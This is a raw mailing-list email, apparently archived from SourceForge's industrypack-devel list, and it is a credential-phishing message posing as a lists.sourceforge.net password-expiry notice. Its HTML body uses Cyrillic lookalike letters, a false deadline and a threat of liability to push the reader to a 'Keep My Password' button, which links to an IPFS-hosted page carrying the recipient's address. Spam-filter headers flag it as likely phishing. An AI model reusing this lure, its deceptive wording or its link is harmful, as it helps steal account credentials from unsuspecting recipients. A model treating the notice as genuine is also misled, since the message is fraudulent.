Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 1EBE4A709E2
	for <lists+industrypack-devel@lfdr.de>; Tue, 25 Mar 2025 20:05:08 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1tx9aD-0004kt-JT
	for lists+industrypack-devel@lfdr.de;
	Tue, 25 Mar 2025 19:05:06 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <sales@dipakmachinetools.in>) id 1tx9aB-0004ke-3Q
 for industrypack-devel@lists.sourceforge.net;
 Tue, 25 Mar 2025 19:05:03 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=VK2bYQ2zGpfOJ5yHuj9S3qdHJwKTVtO3wdS/cEnYoXc=; b=nLaW7z3I4IGvXJh09dfW3myEKv
 LG/aSlTvcLAZXto8qIrcPRKE2/ToMnFd9/OOsrBPgpDpzOAC1GJyb8eOAkFY7drqw6l5Zr+TFNHTn
 JeSillO/h8Fw0MtBdzhGomRtQp3ACr+HBkPjBH+2hVQvHEKPnaCFPisjFp4O2VRZt7c4=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=VK2bYQ2zGpfOJ5yHuj9S3qdHJwKTVtO3wdS/cEnYoXc=; b=c
 3IVOjHD6ssN2GeKaNMA4z0c5axQnzOZejHXvfYQqApWdUusjgCIfyTq3kTshQpG690yz1aJmzkIz1
 SPcg6XzC6fJ2LEb5YMNv8C1a34QPHTD64dGB/96gO8Mo0aXewx61TQA0UAj3Njxc4HRADkP/WLtot
 1O3607XWVmAvx2WI=;
Received: from server.mail.moocowmedia.co.uk ([78.31.110.91])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1tx9a1-0004dE-51 for industrypack-devel@lists.sourceforge.net;
 Tue, 25 Mar 2025 19:05:03 +0000
Received: from [23.175.50.108] (port=54468)
 by server.mail.moocowmedia.co.uk with esmtpsa (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.98.1)
 (envelope-from <sales@dipakmachinetools.in>)
 id 1tx9Zu-000000000HM-0Pz3
 for industrypack-devel@lists.sourceforge.net;
 Tue, 25 Mar 2025 19:04:46 +0000
From: Server Administrator <sales@dipakmachinetools.in>
To: industrypack-devel@lists.sourceforge.net
Date: 25 Mar 2025 14:04:44 -0500
Message-ID: <20250325140444.595C3C9674D74C9E@dipakmachinetools.in>
MIME-Version: 1.0
X-AntiAbuse: This header was added to track abuse,
 please include it with any abuse report
X-AntiAbuse: Primary Hostname - server.mail.moocowmedia.co.uk
X-AntiAbuse: Original Domain - lists.sourceforge.net
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - dipakmachinetools.in
X-Get-Message-Sender-Via: server.mail.moocowmedia.co.uk: authenticated_id:
 info@centreforspirituality.org
X-Authenticated-Sender: server.mail.moocowmedia.co.uk: info@centreforspirituality.org
X-Source: 
X-Source-Args: 
X-Source-Dir: 
X-Spam-Score: 6.6 (++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Notice: lists.sourceforge.net Your password is set to expire
    on 27/03/2025 8:29:45 a.m. ⦿ industrypack-devel@lists.sourceforge.net 
 
 Content analysis details:   (6.6 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
                             [78.31.110.91 listed in wl.mailspike.net]
  0.1 URIBL_SBL_A            Contains URL's A record listed in the Spamhaus SBL
                             blocklist
 [URIs: bafkreihjylem7ugmjsarjbm6jth2dhsnp2rw4xrf6juqusl43h55hiwxc4.ipfs.dweb.link]
  0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
                             query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                           [78.31.110.91 listed in sa-trusted.bondedsender.org]
  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
                             query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                             [78.31.110.91 listed in bl.score.senderscore.com]
  1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 T_MXG_EMAIL_FRAG       URI with email in fragment
  0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
                             identical to background
  0.0 HTML_MESSAGE           BODY: HTML included in message
  1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
                             blocklist
 [URIs: bafkreihjylem7ugmjsarjbm6jth2dhsnp2rw4xrf6juqusl43h55hiwxc4.ipfs.dweb.link]
  3.5 URI_DWEBIPFS           References Interplanetary File System PtP content
                             via dweb.link, likely phishing
  0.0 URI_IPFS               References Interplanetary File System PtP content,
                             probable phishing
X-Headers-End: 1tx9a1-0004dE-51
Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net
 Password notice
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6115113649501905973=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6115113649501905973==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<p style=3D"text-align: left; color: rgb(0, 0, 0); text-transform: none; te=
xt-indent: 0px; letter-spacing: normal; font-family: Verdana; font-size: 12=
px; font-style: normal; font-weight: 400; margin-top: 0px; margin-bottom: 1=
rem; word-spacing: 0px; white-space: normal; box-sizing: border-box; orphan=
s: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatur=
es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;"><span styl=
e=3D"color: rgb(255, 108, 44); font-family: Segoe UI Light; font-size: x-la=
rge; box-sizing: border-box;">Notice: lists.sourceforge.net</span><br style=
=3D"color: rgb(29, 34, 40); font-size: 13px; box-sizing: border-box;"><br s=
tyle=3D"color: rgb(29, 34, 40); font-size: 13px; box-sizing: border-box;">
<span style=3D'margin: 0px; padding: 0px; color: rgb(29, 34, 40); text-tran=
sform: none; line-height: inherit; text-indent: 0px; letter-spacing: normal=
; font-family: "Segoe UI Light", serif, EmojiFont; font-size: 13px; font-st=
yle: normal; font-weight: 400; word-spacing: 0px; vertical-align: baseline;=
 white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; font-s=
tretch: inherit;'>Your password is set to expire on&nbsp;27/03/2025 8:29:45=
 a.m.<br style=3D"box-sizing: border-box;">
<br style=3D"box-sizing: border-box;"></span><span style=3D"box-sizing: bor=
der-box;">&nbsp;</span><span style=3D"box-sizing: border-box;"><span>&nbsp;=
</span>&nbsp;</span><span>&nbsp;</span><span style=3D"color: rgb(36, 36, 36=
); text-transform: none; text-indent: 0px; letter-spacing: normal; font-fam=
ily: Arial, Helvetica, sans-serif; font-size: 15px; font-style: normal; fon=
t-weight: 400; word-spacing: 0px; white-space: normal; box-sizing: border-b=
ox; orphans: 2; widows: 2;">&nbsp;</span>
<span style=3D"box-sizing: border-box;">&nbsp;</span><span style=3D"box-siz=
ing: border-box;">&nbsp;</span><span>&nbsp;</span><span>&nbsp;</span>
<span style=3D'margin: 0px; padding: 0px; color: rgb(29, 34, 40); text-tran=
sform: none; line-height: inherit; text-indent: 0px; letter-spacing: normal=
; font-family: "Segoe UI Light", serif, EmojiFont; font-size: 13px; font-st=
yle: normal; font-weight: 400; word-spacing: 0px; vertical-align: baseline;=
 white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; font-s=
tretch: inherit;'>&#10687;<span style=3D"box-sizing: border-box;">&nbsp;</s=
pan> industrypack-devel@lists.sourceforge.net</span>
<br style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px=
; letter-spacing: normal; font-family: "Segoe UI Light"; font-size: 13px; f=
ont-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal=
; box-sizing: border-box; orphans: 2; widows: 2;'>
<br style=3D'color: rgb(29, 34, 40); text-transform: none; text-indent: 0px=
; letter-spacing: normal; font-family: "Segoe UI Light"; font-size: 13px; f=
ont-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal=
; box-sizing: border-box; orphans: 2; widows: 2;'>
<span style=3D'margin: 0px; padding: 0px; color: rgb(29, 34, 40); text-tran=
sform: none; line-height: inherit; text-indent: 0px; letter-spacing: normal=
; font-family: "Segoe UI Light", serif, EmojiFont; font-size: 13px; font-st=
yle: normal; font-weight: 400; word-spacing: 0px; vertical-align: baseline;=
 white-space: normal; box-sizing: border-box; orphans: 2; widows: 2; font-s=
tretch: inherit;'>
We advise you to take the t&#1110;me now to keep y&#1086;ur mail box p&#107=
2;ssword and avoid log&#1110;n &#1110;nterruptions or account lockouts.</sp=
an></p>
<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
 sans-serif; font-size: small; font-style: normal; font-weight: 400; word-s=
pacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widow=
s: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal;=
 font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration=
-thickness: initial; text-decoration-style:=20
initial; text-decoration-color: initial;"><span style=3D"font-family: Segoe=
 UI Light, serif, EmojiFont; box-sizing: border-box;"><br style=3D"color: r=
gb(29, 34, 40); font-size: 13px; box-sizing: border-box;"></span>&nbsp; &nb=
sp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &=
nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br style=3D'color: rgb(29, 34, 40)=
; font-family: "Segoe UI Light"; font-size: 13px; box-sizing: border-box;'>=

<a style=3D'background: rgb(255, 108, 44); margin: 0px; padding: 7px; color=
: rgb(255, 255, 255); line-height: inherit; font-family: "segoe ui light"; =
font-size: 15px; text-decoration: none; vertical-align: baseline; box-sizin=
g: border-box; font-stretch: inherit;' href=3D"https://bafkreihjylem7ugmjsa=
rjbm6jth2dhsnp2rw4xrf6juqusl43h55hiwxc4.ipfs.dweb.link/#industrypack-devel@=
lists.sourceforge.net" target=3D"_blank" rel=3D"noreferrer"><strong style=
=3D"font-weight: bolder; box-sizing: border-box;">
K&#1077;&#1077;p My &#1056;&#1072;ssword</strong></a><br><br><br style=3D'c=
olor: rgb(51, 51, 51); font-family: "Lucida Grande", Verdana, Arial, Helvet=
ica, sans-serif; font-size: 11px; box-sizing: border-box;'><br style=3D"box=
-sizing: border-box;"><br style=3D"color: rgb(36, 36, 36); font-size: 15px;=
 box-sizing: border-box;"><span style=3D"color: rgb(36, 36, 36); font-size:=
 15px; box-sizing: border-box;">N&#1086;t&#1077;:</span><span style=3D"box-=
sizing: border-box;">&nbsp;</span>
<span style=3D"margin: 0px; padding: 0px; color: rgb(36, 36, 36); line-heig=
ht: inherit; font-size: 15px; vertical-align: baseline; box-sizing: border-=
box; font-stretch: inherit;">&nbsp;</span><span style=3D"color: rgb(255, 0,=
 0); font-size: 15px; box-sizing: border-box;">You are liable for any loss =
due to skipped validation prompts.</span><br style=3D"color: rgb(36, 36, 36=
); font-size: 15px; box-sizing: border-box;"><br style=3D"color: rgb(36, 36=
, 36); font-size: 15px; box-sizing: border-box;">
<br style=3D"color: rgb(36, 36, 36); font-size: 15px; box-sizing: border-bo=
x;"><br style=3D"color: rgb(36, 36, 36); font-size: 15px; box-sizing: borde=
r-box;"><span style=3D"color: rgb(36, 36, 36); font-size: 15px; box-sizing:=
 border-box;">Thank you,</span><br style=3D"color: rgb(36, 36, 36); font-si=
ze: 15px; box-sizing: border-box;"><span style=3D"color: rgb(36, 36, 36); f=
ont-size: 15px; box-sizing: border-box;">lists.sourceforge.net&nbsp; Suppor=
t</span></div>
</body></html>


--===============6115113649501905973==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6115113649501905973==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6115113649501905973==--
